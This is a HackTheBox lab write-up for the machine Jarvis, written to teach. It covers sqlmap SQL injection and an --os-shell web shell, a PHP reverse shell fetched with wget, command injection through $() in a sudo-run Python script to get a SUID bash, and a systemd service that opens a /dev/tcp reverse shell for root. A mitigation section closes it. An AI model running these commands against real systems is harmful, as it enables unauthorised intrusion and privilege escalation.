---
title: "HackTheBox - Jarvis"
author: Nasrallah
description: ""
date: 2023-06-23 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, sqli, sqlmap, sudo, suid, python]
img_path: /assets/img/hackthebox/machines/jarvis
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Jarvis](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.143
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03f34e22363e3b813079ed4967651667 (RSA)
|   256 25d808a84d6de8d2f8434a2c20c85af6 (ECDSA)
|_  256 77d4ae1fb0be151ff8cdc8153ac369e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
|_http-server-header: Apache/2.4.25 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two ports, 22 running OpenSSH and port 80 is an Apache web server. Both services are on a Debian machine.

### Web

Let's navigate to the website.

![](1.png)

This is a hotel's website, we discover the domain `supersecurehotel.htb`, let's add it to `/etc/hosts`.

Going through the website pages we find a booking page that uses a parameter in the request `http://supersecurehotel.htb/room.php?cod=6`

![](2.png)

#### SQLMap

Let's give the url to `sqlmap` and see if the website is vulnerable to `sql injection``.

```bash
sqlmap -u 'http://supersecurehotel.htb/room.php?cod=1' --batch
```

![](3.png)

It's vulnerable!

## **Foothold**

I Dumped the database but there is nothing useful there.

Since the website uses php, let's write a php web shell with the help of `--os-shell` option in `sqlmap`

```bash
sqlmap -u 'http://supersecurehotel.htb/room.php?cod=1' --batch --os-shell
```

![](4.png)

Great! We got command execution, but the we don't have a full shell yet. To do that we can upload a php reverse shell to the target.

First we setup an http server on our machine using python:

```bash
python3 -m http.server 80
```

Now We put a php reverse shell on the directory where we run the python server.

> The php shell i used is Ivan's php shell, you can find it [here](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

On the target machine we run the command `wget {AttackerIp}/shell.php`, which uploads the shell to the `/www/var/html` directory which is the root directory for the target's website. 

Now we setup a listener and request the file on the browser or using curl `curl http://supersecurehotel.htb/shell.php`

![](5.png)

## **Privilege Escalation**

Running `linpeas` we find two interesting things.

First is that we can run a python script at user `pepper`.

```shell
Matching Defaults entries for www-data on jarvis:                                                                                                             
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                    
                                                                                                                                                              
User www-data may run the following commands on jarvis:                                                                                                       
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py     
```

The second thing is that `systemctl` has the suid permission.

![](6.png)

Unfortunately only user `pepper` has execute permissions.

### www-data --> pepper

Let's check what the script does.

```python
#!/usr/bin/env python3                                                                                                                                        
from datetime import datetime                                                                                                                                 
import sys                                                                                                                                                    
import os                                                                                                                                                     
from os import listdir                                                                                                                                        
import re                                                                                                                                                     
                                       
def show_help():                                                               
    message='''                                                                
********************************************************
* Simpler   -   A simple simplifier ;)                 *                       
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP 
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                        
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                 
***********************************************
[...] REDACTED
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

We see that script gives the ability to run ping scans with the option `-p`, the problem is that it uses a black list of bad characters for input validation and passes the user input directly to a system command.

This is clearly vulnerable to `OS Command Injection`.

The script block most of the characters that would allow us to inject a command but it forgot this one `$()`.

Let's use that to create a copy of bash with suid permissions.

```bash
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p            
***********************************************                                                                                                               
     _                 _                                                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _                                                                                                                
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                 
***********************************************

Enter an IP: $(cp /bin/bash /home/pepper/bash)
```

This copied `bash` to `pepper`'s home directory, now let's give it suid permission.

```bash
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p            
***********************************************                                                                                                               
     _                 _                                                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _                                                                                                                
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                 
***********************************************

Enter an IP: $(chmod +s /home/pepper/bash)
```

Nice, now we run `/home/pepper/bash -p` to get a shell as `pepper`.

```shell
www-data@jarvis:/var/www/Admin-Utilities$ /home/pepper/bash -p                 
bash-4.4$ whoami                                                                                                                                              
pepper        
```

### pepper --> root

We saw earlier that `systemctl` has suid permissions, let's create a service that would send us a shell when it starts.

First we create a service file with the name `root.service` with the following content:

```shell
[Unit]
Description=hack

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9002 0>&1'

[Install]
WantedBy=multi-user.target
```

Now we enable the service using the following command:

```bash
bash-4.4$ /bin/systemctl enable /home/pepper/root.service 
Created symlink /etc/systemd/system/multi-user.target.wants/root.service -> /home/pepper/root.service.
Created symlink /etc/systemd/system/root.service -> /home/pepper/root.service.
```

After setting up the listener, let's start the service with the command:

```shell
/bin/systemctl start root
```

If we got to our listener, we find the root shell

```bash
$ nc -lvnp 9002                                                                                                                                    130 ⨯
listening on [any] 9002 ...
connect to [10.10.17.90] from (UNKNOWN) [10.10.10.143] 37242
bash: cannot set terminal process group (32856): Inappropriate ioctl for device
bash: no job control in this shell
root@jarvis:/# id
id
uid=0(root) gid=0(root) groups=0(root)  
```

## **Prevention and Mitigation**

### SQL injection

The website should use a solid input validation and parameterized queries to seperate user input from the query structure.

### OS Command injection

The python script should use proper input validation, and it's better to use libraries to carry out actions instead of calling OS commands directly

### SUID

There are some linux commands that should not have the SUID because that leads to privileges escalation, `systemctl` is one of them, for a full list check [GTFOBins](https://gtfobins.github.io/)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).